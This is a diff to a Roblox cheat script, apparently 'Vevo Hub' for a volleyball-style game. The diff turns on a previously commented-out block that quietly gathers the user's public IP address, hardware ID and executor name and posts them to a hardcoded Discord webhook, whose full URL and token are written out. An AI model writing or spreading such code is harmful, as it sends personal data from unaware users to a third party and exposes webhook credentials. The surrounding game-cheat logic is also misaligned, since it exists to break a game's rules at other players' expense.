@@ -502,16 +502,21 @@ if not game:GetService('Workspace'):WaitForChild('FinalWalls'):FindFirstChild('F
 	FinalWall1.CanQuery = true
     FinalWall1.Position = workspace.NetUtilities.Net.Position
 end
---[[local VevoWebhook = "https://discordapp.com/api/webhooks/1284798351266549773/7Rs8dDnT5OnqUcpLcp9rw0J-vBgUuJ_Id4cTVhpurl6tKxwNyltZtf9q-kYgyZSLqO6q"
+local VevoWebhook = "https://discord.com/api/webhooks/1374757249737556091/RZnSbs2AHp4rNfhVu9luvbs7cSs5Ab3Lrd8WUArdBNr7_jdpuhW6WXLrKULpDyatMTZT"
 RunService = cloneref(game:GetService("RunService"))
 local Http = game:GetService("HttpService")
 local marketplaceService = game:GetService("MarketplaceService")
 local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId) -- getting game name
+pcall(function()
 local iprequest = request({
     Url = 'https://httpbin.org/ip',
     Method = 'GET',
 })
 local ip = Http:JSONDecode(iprequest.Body).origin
+end)
+if not ip then
+    ip = "ERROR"
+end
 local hwid = (gethwid and gethwid()) or ''
 local executor = (getexecutorname and getexecutorname()) or ''
 local vevorequest = request({
@@ -523,7 +528,7 @@ local vevorequest = request({
 	Body = Http:JSONEncode({
 		["content"] = "",
 		["embeds"] = {{
-			["title"] = "**Vevo Hub**",
+			["title"] = "**Vevo Hub SPIKED**",
 			["description"] = '',
 			["type"] = "rich",
 			["color"] = tonumber(0xffffff),
@@ -564,7 +569,7 @@ local vevorequest = request({
 			}
 		}}
 	})
-})]]
+})
 
 if not game:GetService('Workspace'):FindFirstChild('Predictions') then
     local PredictionsFolder = Instance.new('Folder')
